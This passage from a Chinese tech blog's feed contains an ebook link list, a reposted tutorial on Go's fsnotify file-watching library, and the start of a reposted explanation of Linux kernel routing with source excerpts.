href="https://tutorial.djangogirls.org/zh/">Django Girls 教程 (1.11)</a> (HTML)</li></ul><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><ul><li><a href="http://cran.r-project.org/doc/contrib/Liu-FAQ.pdf">153分钟学会 R</a> (PDF)</li><li><a href="http://cran.r-project.org/doc/contrib/Xu-Statistics_and_R.pdf">统计学与 R 读书笔记</a> (PDF)</li><li><a href="https://web.archive.org/web/20200220023703/yanping.me/shiny-tutorial/">用 R 构建 Shiny 应用程序</a> (《Building ‘Shiny’ Applications with R》中文版) <em>(:card_file_box: archived)</em></li><li><a href="http://cran.r-project.org/doc/contrib/Ding-R-intro_cn.pdf">R 导论</a> (《An Introduction to R》中文版) (PDF)</li></ul><h3 id="reStructuredText"><a href="#reStructuredText" class="headerlink" title="reStructuredText"></a>reStructuredText</h3><ul><li><a href="http://www.pythondoc.com/sphinx/rest.html">reStructuredText 入门</a></li></ul><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><ul><li><a href="http://lrthw.github.io/">笨方法学 Ruby</a></li><li><a href="https://github.com/JuanitoFatas/rails-style-guide/blob/master/README-zhCN.md">Rails 风格指南</a></li><li><a href="https://github.com/JuanitoFatas/ruby-style-guide/blob/master/README-zhCN.md">Ruby 风格指南</a></li><li><a href="https://ihower.tw/rails4/">Ruby on Rails 实战圣经</a></li><li><a href="https://ruby-china.github.io/rails-guides/">Ruby on Rails 指南</a></li><li><a href="http://www.sinatrarb.com/intro-zh.html">Sinatra</a></li></ul><h3 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h3><ul><li><a href="https://github.com/rustcc/rust-by-example/">通过例子学习 Rust</a></li><li><a href="https://github.com/KaiserY/rust-book-chinese">Rust 官方教程</a></li><li><a href="https://github.com/photino/rust-notes">Rust 语言学习笔记</a></li><li><a href="https://github.com/rustcc/RustPrimer">RustPrimer</a></li><li><a href="https://tourofrust.com/00_zh-cn.html">Tour of Rust</a></li></ul><h3 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h3><ul><li><a href="http://twitter.github.io/effectivescala/index-cn.html">Effective Scala</a></li><li><a href="http://twitter.github.io/scala_school/zh_cn/index.html">Scala 课堂</a> (Twitter的Scala中文教程)</li></ul><h3 id="Scheme"><a href="#Scheme" class="headerlink" title="Scheme"></a>Scheme</h3><ul><li><a href="http://deathking.github.io/yast-cn/">Scheme 入门教程</a> (《Yet Another Scheme Tutorial》中文版)</li></ul><h3 id="Scratch"><a href="#Scratch" class="headerlink" title="Scratch"></a>Scratch</h3><ul><li><a href="http://cccgchinese.strikingly.com/">创意计算课程指南</a></li></ul><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><ul><li><a href="https://tinylab.gitbooks.io/shellbook/content">Shell 编程范例</a> - 泰晓科技</li><li><a href="http://wiki.ubuntu.org.cn/Shell%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80">Shell 编程基础</a></li><li><a href="https://github.com/qinjx/30min_guides/blob/master/shell.md">Shell 脚本编程30分钟入门</a></li><li><a href="http://me.52fhy.com/shell-book/">shell-book</a></li><li><a href="http://billie66.github.io/TLCL/book/">The Linux Command Line 中文版</a></li></ul><h3 id="Swift"><a href="#Swift" class="headerlink" title="Swift"></a>Swift</h3><ul><li><a href="https://www.gitbook.com/book/numbbbbb/-the-swift-programming-language-/details">《The Swift Programming Language》中文版</a></li></ul><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><ul><li><a href="https://www.runoob.com/typescript/ts-tutorial.html">TypeScript 教程</a> - runoob (HTML)</li><li><a href="https://www.runoob.com/w3cnote/getting-started-with-typescript.html">TypeScript 入门教程</a> - runoob (HTML)</li><li><a href="https://www.tslang.cn/">TypeScript 中文网</a> (HTML)</li><li><a href="https://github.com/jkchao/typescript-book-chinese">TypeScript Deep Dive 中文版</a> - 三毛 (HTML)</li><li><a href="https://www.runoob.com/manual/gitbook/TypeScript/_book/">TypeScript Handbook（中文版）</a> - Patrick Zhong (HTML)</li></ul><h4 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h4><blockquote><p>:information_source: See also &amp;#8230; <a href="#angularjs">AngularJS</a></p></blockquote><ul><li><a href="https://angular.cn/docs">Angular 文档简介</a> - Wang Zhicheng, Ye Zhimin, Yang Lin et al. (HTML)</li><li><a href="https://material.angular.cn/">Angular Material 组件库</a> - Wang Zhicheng, Ye Zhimin, Yang Lin, et al. (HTML)</li><li><a href="https://angular.cn/tutorial">Angular Tutorial (教程：英雄之旅)</a> - Wang Zhicheng, Ye Zhimin, Yang Lin, et al. (HTML)</li></ul><h4 id="Deno"><a href="#Deno" class="headerlink" title="Deno"></a>Deno</h4><ul><li><a href="https://deno-tutorial.js.org/">Deno 钻研之术</a></li><li><a href="https://chenshenhai.com/deno_note">Deno进阶开发笔记</a> - 大深海</li></ul><h3 id="VBA-Microsoft-Visual-Basic-Applications"><a href="#VBA-Microsoft-Visual-Basic-Applications" class="headerlink" title="VBA (Microsoft Visual Basic Applications)"></a>VBA (Microsoft Visual Basic Applications)</h3><ul><li><a href="https://github.com/Youchien/concise-excel-vba">简明Excel VBA</a></li></ul><h3 id="Visual-Prolog"><a href="#Visual-Prolog" class="headerlink" title="Visual Prolog"></a>Visual Prolog</h3><ul><li><a href="http://wiki.visual-prolog.com/index.php?title=Visual_Prolog_for_Tyros_in_Chinese">Visual Prolog 7边练边学</a></li><li><a href="http://wiki.visual-prolog.com/index.php?title=A_Beginners_Guide_to_Visual_Prolog_in_Chinese">Visual Prolog 7初学指南</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>电子书</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>电子书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 使用 fsnotify 监听文件</title>
    <link href="/2023/02/28/Go%20%E4%BD%BF%E7%94%A8%20fsnotify%20%E7%9B%91%E5%90%AC%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/Go%20%E4%BD%BF%E7%94%A8%20fsnotify%20%E7%9B%91%E5%90%AC%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-使用-fsnotify-监听文件"><a href="#Go-使用-fsnotify-监听文件" class="headerlink" title="Go 使用 fsnotify 监听文件"></a>Go 使用 fsnotify 监听文件</h1><blockquote><p>主要内容转载自<strong>Golang语言开发栈</strong>的<a href="https://mp.weixin.qq.com/s/tJ1LvDf14EKg-qQlJUQapQ">Go 语言跨平台文件监听库 fsnotify 怎么使用？</a></p></blockquote><h3 id="01-介绍"><a href="#01-介绍" class="headerlink" title="01 介绍"></a><strong>01</strong> 介绍</h3><p>Go 语言作为静态编译型语言，每次修改配置文件后，我们都需要重新编译，修改的配置信息才可以生效，而动态编译型语言修改配置文件可以自动生效，相对来说更方便一些。</p><p>但是，我们可以使用三方开源库 <code>fsnotify</code>，这是一款非常流行的文件系统监听库，很多开源的三方库也都使用该库实现监听文件变更，比如流行的管理配置信息开源库 <code>viper</code>。</p><p>另外，fsnotify也可以用作于安全场景，用于监听系统中敏感文件是否被未授权访问以及更新。</p><h3 id="02-fsnotify-源码解读"><a href="#02-fsnotify-源码解读" class="headerlink" title="02 fsnotify 源码解读"></a><strong>02</strong> fsnotify 源码解读</h3><p><strong>NewWatcher 函数：</strong></p><p><code>fsnotify</code> 提供了 <code>NewWatcher</code> 函数，使用该函数可以创建一个监听器。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewWatcher creates a new Watcher.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewWatcher</span><span class="hljs-params">()</span></span> (*Watcher, <span class="hljs-type">error</span>) &#123;<br> <span class="hljs-comment">// 省略代码 ...</span><br><br> w := &amp;Watcher&#123;<br>  <span class="hljs-comment">// 省略代码 ...</span><br>  Events:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Event),<br>  Errors:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>),<br>  <span class="hljs-comment">// 省略代码 ...</span><br> &#125;<br><br> <span class="hljs-keyword">go</span> w.readEvents()<br> <span class="hljs-keyword">return</span> w, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>阅读 <code>NewWatcher</code> 函数的源码，我们可以发现，该函数返回一个 <code>*Watcher</code>。</p><p>并且我们可以发现该结构体的两个公开字段 <code>Events</code> 和 <code>Errors</code> 分别是 <code>Event</code> 类型和 <code>error</code> 类型的 <code>channel</code>。</p><p><strong>事件：</strong></p><p><code>Event</code> 类型的字段 <code>Events</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Event <span class="hljs-keyword">struct</span> &#123;<br> Name <span class="hljs-type">string</span><br> Op Op<br>&#125;<br><br><span class="hljs-keyword">type</span> Op <span class="hljs-type">uint32</span><br><br><span class="hljs-keyword">const</span> (<br> Create Op = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-literal">iota</span><br> Write<br> Remove<br> Rename<br> Chmod<br>)<br></code></pre></td></tr></table></figure><p>阅读上面这段代码，我们可以发现 <code>Event</code> 包含两个字段，分别表示事件名称和操作类型，其中，事件操作类型有 5 个，分别是 <code>Create</code>、<code>Write</code>、<code>Remove</code>、<code>Rename</code> 和 <code>Chmod</code>。</p><p>我们可以启动一个协程，使用 <code>for ... select</code> 监听 <code>watcher</code> 的 <code>Events</code> 和 <code>Errors</code> 通道并输出事件信息和错误信息。</p><p><code>Event</code> 包含 2 个方法，分别是 <code>Has</code> 和 <code>String</code>，<code>Has</code> 用于判断事件是否包含给定操作，源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Has reports if this event has the given operation.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e Event)</span></span> Has(op Op) <span class="hljs-type">bool</span> &#123; <span class="hljs-keyword">return</span> e.Op.Has(op) &#125;<br></code></pre></td></tr></table></figure><p><strong>监听器：</strong></p><p><code>Watcher</code> 包含 4 个公共方法，分别是 <code>Add</code>、<code>Close</code>、<code>Remove</code> 和 <code>WatchList</code>。</p><ul><li>Add - 用于指定监听目录或监听文件，需要注意的是，<strong>指定目录仅能监听该目录中的所有文件，无法监听该目录中子目录的文件。</strong></li><li>Close - 删除所有监听，并关闭 <code>Events</code> 通道。</li><li>Remove - 停止监视指定目录或指定文件的变更，需要注意的是，指定目录仅代表当前目录，指定目录中的子目录需单独停止监听。删除未被监听的目录或文件，将会返回错误。</li><li>WatchList - 返回尚未被删除的所有使用 <code>Add</code> 添加的目录或文件。</li></ul><h3 id="03-fsnotify-使用原理"><a href="#03-fsnotify-使用原理" class="headerlink" title="03 fsnotify 使用原理"></a><strong>03</strong> fsnotify 使用原理</h3><p><img src="https://pic1.zhimg.com/80/v2-23048f6ebd328b9f631285c06c0ff5fc_1440w.webp" alt="img"></p><p>如上图所示 fsnotify作为“<strong>后端</strong>“，负责接收文件事件，它被作为”<strong>前端</strong>“、和listener直接交互的dnotify, inotify和fanotify所共享。</p><p>每一个前端instance被抽象为一个”group”（在代码中由”fsnotify_group”结构体表示），每个group都有自己的notification queue（以下简称”nq”），用于向listener传递事件。</p><p>从效率的角度，fsnotify不会把收到的事件依次放到每个group的”nq”上，而是只维护一个event queue，根据各个group配置的mask，在其对应的”nq”里存放指针，指向event queue中感兴趣的事件。</p><h3 id="04-fsnotify-使用示例"><a href="#04-fsnotify-使用示例" class="headerlink" title="04 fsnotify 使用示例"></a><strong>04</strong> fsnotify 使用示例</h3><p>在了解完 <code>fsnotify</code> 源码之后，我们再介绍一下 <code>fsnotify</code> 的使用示例。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-comment">// 创建一个监听器</span><br> watcher, err := fsnotify.NewWatcher()<br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>  log.Fatal(err)<br> &#125;<br> <span class="hljs-comment">// 关闭监听器</span><br> <span class="hljs-keyword">defer</span> watcher.Close()<br> <span class="hljs-comment">// 开始监听事件</span><br> <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">for</span> &#123;<br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-keyword">case</span> event, ok := &lt;-watcher.Events:<br>    <span class="hljs-keyword">if</span> !ok &#123;<br>     <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> event.Has(fsnotify.Write) &#123;<br>     <span class="hljs-comment">// 自动加载文件内容</span><br>     f, _ := os.Open(<span class="hljs-string">&quot;log.txt&quot;</span>)<br>     _, _ = io.Copy(os.Stdout, f)<br>    &#125;<br>  &#125;<br> &#125;()<br> <span class="hljs-comment">// 添加监听目录</span><br> err = watcher.Add(<span class="hljs-string">&quot;./&quot;</span>)<br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>  log.Fatal(err)<br> &#125;<br> <span class="hljs-comment">// 永久阻塞 main goroutine</span><br> &lt;-<span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>阅读上面这段示例代码，我们可以发现，使用 <code>fsnotify</code> 非常简单。</p><p>首先，使用 <code>NewWatcher</code> 函数创建一个 <code>watcher</code>，然后，使用 <code>Add</code> 方法添加监听目录或文件，最后，使用 <code>defer</code> 调用 <code>Close</code> 方法，关闭监听器，释放系统资源。</p><p>示例代码中，启动一个 <code>goroutine</code> 循环输出事件通道中的事件，发现 <code>Write</code> 操作类型的事件时，将 <code>log.txt</code> 中的文件内容拷贝到标准输出。</p><p>我们可以在运行该程序后，修改 <code>log.txt</code> 中的内容，终端将会打印该文件修改后的最新内容。</p><p><strong>我们可以使用该特性，自动监听应用程序的配置文件，避免修改配置信息后，还需要重新编译并启动应用才可以生效。</strong></p><h3 id="05-总结"><a href="#05-总结" class="headerlink" title="05 总结"></a><strong>05</strong> 总结</h3><p>本文我们介绍了跨平台文件监听库 <code>fsnotify</code>，它主要用于自动监听文件中的内容变更。</p><p>我们通过 <code>fsnotify</code> 源码和示例代码，介绍了该库支持的功能和使用方式。</p><p>建议感兴趣的朋友，继续阅读参考链接中该库的官方文档和源码，了解在不同系统平台中使用的注意事项，并有效运用在自己的项目中。</p><h3 id="06-参考资料："><a href="#06-参考资料：" class="headerlink" title="06 参考资料："></a>06 <strong>参考资料：</strong></h3><ol><li><a href="https://pkg.go.dev/github.com/fsnotify/fsnotify">https://pkg.go.dev/github.com/fsnotify/fsnotify</a></li><li><a href="https://github.com/fsnotify/fsnotify">https://github.com/fsnotify/fsnotify</a></li><li><a href="https://zhuanlan.zhihu.com/p/186027813">https://zhuanlan.zhihu.com/p/186027813</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>路由到底是咋实现的？</title>
    <link href="/2023/02/12/%E8%B7%AF%E7%94%B1%E5%88%B0%E5%BA%95%E6%98%AF%E5%92%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F/"/>
    <url>/2023/02/12/%E8%B7%AF%E7%94%B1%E5%88%B0%E5%BA%95%E6%98%AF%E5%92%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-路由到底是咋实现的？"><a href="#Linux-路由到底是咋实现的？" class="headerlink" title="Linux 路由到底是咋实现的？"></a>Linux 路由到底是咋实现的？</h1><blockquote><p>转载自 张彦飞的<a href="https://www.51cto.com/article/698945.html">天天讲路由，那 Linux 路由到底咋实现的！？</a></p></blockquote><p><strong>容器是一种新的虚拟化技术，每一个容器都是一个逻辑上独立的网络环境。Linux 上提供了软件虚拟出来的二层交换机 Bridge 可以解决同一个宿主机上多个容器之间互连的问题，但这是不够的。二层交换无法解决容器和宿主机外部网络的互通。</strong></p><p><strong>二层与三层的区别是什么呢？：二层交换机基于MAC地址访问，只做数据的转发，并且不能配置IP地址，而三层交换机将二层交换技术和三层转发功能结合在一起，也就是说三层交换机在二层交换机的基础上增加了路由功能，可配置不同VLAN的IP地址，可通过三层路由实现不同VLAN之间通讯。</strong></p><p>容器肯定是需要和宿主机以外的外部网络互通才具备实用价值的。比如在 Kubernets 中，就要求所有的 pod 之间都可以互通。相当于在原先物理机所组成的网络之上，要再建一个互通的虚拟网络出来。这就是 Overlay 网络的概念，用一个简单的示例图表示如下。</p><p><a href="https://s2.51cto.com/oss/202201/13/275509b6046a5ed6c383fd353c209354.png"><img src="https://s2.51cto.com/oss/202201/13/275509b6046a5ed6c383fd353c209354.png" alt="img"></a></p><p>回想在传统物理物理网络中，不同子网之间的服务器是如何互联起来的呢，没错，就是在三层工作的路由器，也叫网关。路由器使得数据包可以从一个子网中传输到另一个子网中，进而实现更大范围的网络互通。如下图所示，一台路由器将 192.168.0.x 和 192.168.1.x 两个子网连接了起来。</p><p><a href="https://s5.51cto.com/oss/202201/13/499a3d67e7868519dadb3102682f15e0.png"><img src="https://s5.51cto.com/oss/202201/13/499a3d67e7868519dadb3102682f15e0.png" alt="img"></a></p><p>在容器虚拟化网络中，自然也需要这么一个角色，将容器和宿主机以外的网络连接起来。其实 Linux 天生就具备路由的功能，只是在云原生时代，它的路由功能再一次找到了用武之地。在容器和外部网络通信的过程中，Linux 就又承担起路由器的角色，实现容器数据包的正确转发和投递。</p><p><a href="https://s2.51cto.com/oss/202201/13/d93141cff21a2dd1cc0114fdf528b688.png"><img src="https://s2.51cto.com/oss/202201/13/d93141cff21a2dd1cc0114fdf528b688.png" alt="img"></a></p><p>在各种基于容器的云原生技术盛行的今天，再次回头深刻理解路由工作原理显得非常有必要，而且也非常的有价值。</p><h2 id="一、什么时候需要路由"><a href="#一、什么时候需要路由" class="headerlink" title="一、什么时候需要路由"></a>一、什么时候需要路由</h2><p>先来聊聊 Linux 在什么情况下需要路由过程。其实在发送数据时和接收数据时都会涉及到路由选择，为什么?我们挨个来看。</p><h3 id="1-1-发送数据时选路"><a href="#1-1-发送数据时选路" class="headerlink" title="1.1 发送数据时选路"></a>1.1 发送数据时选路</h3><p>Linux 之所以在发送数据包的时候需要进行路由选择，这是因为服务器上是可能会有多张网卡设备存在的。数据包在发送的时候，一路通过用户态、TCP 层到了 IP 层的时候，就要进行路由选择，以决定使用哪张网卡设备把数据包送出去。详细过程参见25 张图，一万字，拆解 Linux 网络包发送过程</p><p><a href="https://s2.51cto.com/oss/202201/13/297b9d2ba64a229a61651c29739ec4bc.png"><img src="https://s2.51cto.com/oss/202201/13/297b9d2ba64a229a61651c29739ec4bc.png" alt="img"></a></p><p>来大致过一下路由相关源码源码。网络层发送的入口函数是 ip_queue_xmit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/ip_output.c </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_queue_xmit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> flowi *fl)</span> <br>&#123; <br> <span class="hljs-comment">// 路由选择过程 </span><br> <span class="hljs-comment">// 选择完后记录路由信息到 skb 上 </span><br> rt = (<span class="hljs-keyword">struct</span> rtable *)__sk_dst_check(sk, <span class="hljs-number">0</span>); <br> <span class="hljs-keyword">if</span> (rt == <span class="hljs-literal">NULL</span>) &#123; <br>  <span class="hljs-comment">// 没有缓存则查找路由项 </span><br>  rt = ip_route_output_ports(...); <br>  sk_setup_caps(sk, &amp;rt-&gt;dst); <br> &#125; <br> skb_dst_set_noref(skb, &amp;rt-&gt;dst); <br> ... <br> <span class="hljs-comment">//发送 </span><br> ip_local_out(skb); <br>&#125; <br></code></pre></td></tr></table></figure><p>在 ip_queue_xmit 里我们开头就看到了路由项查找， ip_route_output_ports 这个函数中完成路由选择。路由选择就是到路由表中进行匹配，然后决定使用哪个网卡发送出去。</p><p>Linux 中最多可以有 255 张路由表，其中默认情况下有 local 和 main 两张。使用 ip 命令可以查看路由表的具体配置。拿 local 路由表来举例。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ip route list table <span class="hljs-built_in">local</span></span> <br>local 10.143.x.y dev eth0 proto kernel scope host src 10.143.x.y <br>local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 <br></code></pre></td></tr></table></figure><h3 id="1-2-接收数据时选路"><a href="#1-2-接收数据时选路" class="headerlink" title="1.2 接收数据时选路"></a>1.2 接收数据时选路</h3><p>没错，接收数据包的时候也需要进行路由选择。这是因为 Linux 可能会像路由器一样工作，将收到的数据包通过合适的网卡将其转发出去。</p><p>Linux 在 IP 层的接收入口 ip_rcv 执行后调用到 ip_rcv_finish。在这里展开路由选择。如果发现确实就是本设备的网络包，那么就通过 ip_local_deliver 送到更上层的 TCP 层进行处理。</p><p><a href="https://s2.51cto.com/oss/202201/13/2c715a2b062e8f47a6eb16c0dfe2a318.png"><img src="https://s2.51cto.com/oss/202201/13/2c715a2b062e8f47a6eb16c0dfe2a318.png" alt="img"></a></p><p>如果路由后发现非本设备的网络包，那就进入到 ip_forward 进行转发，最后通过 ip_output 发送出去。</p><p><a href="https://s4.51cto.com/oss/202201/13/30da1e15bf0c9ba606bafc4015046b54.png"><img src="https://s4.51cto.com/oss/202201/13/30da1e15bf0c9ba606bafc4015046b54.png" alt="img"></a></p><p>具体的代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/ip_input.c </span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv_finish</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span>&#123; <br>    ... <br>    <span class="hljs-keyword">if</span> (!skb_dst(skb)) &#123; <br>        <span class="hljs-type">int</span> err = ip_route_input_noref(skb, iph-&gt;daddr, iph-&gt;saddr, <br>                           iph-&gt;tos, skb-&gt;dev); <br>        ... <br>    &#125; <br>    ... <br>    <span class="hljs-keyword">return</span> dst_input(skb); <br>&#125; <br></code></pre></td></tr></table></figure><p>其中 ip_route_input_noref 就是在进行路由查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/route.c </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_route_input_noref</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, __be32 daddr, __be32 saddr, </span><br><span class="hljs-params">    u8 tos, <span class="hljs-keyword">struct</span> net_device *dev)</span> <br>&#123; <br> ... <br> res = ip_route_input_slow(skb, daddr, saddr, tos, dev); <br> <span class="hljs-keyword">return</span> res; <br>&#125; <br><br></code></pre></td></tr></table></figure><p>这里记着 ip_route_input_slow 就行了，后面我们再看。</p><h3 id="1-3-linux-路由小结"><a href="#1-3-linux-路由小结" class="headerlink" title="1.3 linux 路由小结"></a>1.3 linux 路由小结</h3><p>路由在内核协议栈中的位置可以用如下一张图来表示。</p><p><a href="https://s5.51cto.com/oss/202201/13/78121826fe98af632e6b8b2db7a1a242.png"><img src="https://s5.51cto.com/oss/202201/13/78121826fe98af632e6b8b2db7a1a242.png" alt="img"></a></p><p>网络包在发送的时候，需要从本机的多个网卡设备中选择一个合适的发送出去。网络包在接收的时候，也需要进行路由选择，如果是属于本设备的包就往上层送到网络层、传输层直到 socket 的接收缓存区中。如果不是本设备上的包，就选择合适的设备将其转发出去。</p><h2 id="二、Linux-的路由实现"><a href="#二、Linux-的路由实现" class="headerlink" title="二、Linux 的路由实现"></a>二、Linux 的路由实现</h2><h3 id="2-1-路由表"><a href="#2-1-路由表" class="headerlink" title="2.1 路由表"></a>2.1 路由表</h3><p>路由表(routing table)在内核源码中的另外一个叫法是转发信息库(Forwarding Information Base，FIB)。所以你在源码中看到的 fib 开头的定义基本上就是和路由表相关的功能。</p><p>其中路由表本身是用 struct fib_table 来表示的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fib_table</span> &#123;</span> <br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> <span class="hljs-title">tb_hlist</span>;</span> <br> u32   tb_id; <br> <span class="hljs-type">int</span>   tb_default; <br> <span class="hljs-type">int</span>   tb_num_default; <br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  tb_data[<span class="hljs-number">0</span>]; <br>&#125;; <br></code></pre></td></tr></table></figure><p>所有的路由表都通过一个 hash - fib_table_hash 来组织和管理。它是放在网络命名空间 net 下的。这也就说明每个命名空间都有自己独立的路由表。</p><p><a href="https://s6.51cto.com/oss/202201/13/e5b6d8ffc9f528b14bc58764e87947b1.png"><img src="https://s6.51cto.com/oss/202201/13/e5b6d8ffc9f528b14bc58764e87947b1.png" alt="img"></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:include/net/net_namespace.h </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> &#123;</span> <br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_ipv4</span> <span class="hljs-title">ipv4</span>;</span> <br> ... <br>&#125; <br> <br><span class="hljs-comment">//file: include/net/netns/ipv4.h </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_ipv4</span> &#123;</span> <br> <span class="hljs-comment">// 所有路由表  </span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span> *<span class="hljs-title">fib_table_hash</span>;</span> <br> <br> <span class="hljs-comment">// netfilter </span><br> ... <br>&#125; <br></code></pre></td></tr></table></figure><p>在默认情况下，Linux 只有 local 和 main 两个路由表。如果内核编译时支持策略路由，那么管理员最多可以配置 255 个独立的路由表。</p><p>如果你的服务器上创建了多个网络命名空间的话，那么就会存在多套路由表。以除了默认命名网络空间外，又创了了一个新网络命名空间的情况为例，路由表在整个内核数据结构中的关联关系总结如下图所示。</p><p><a 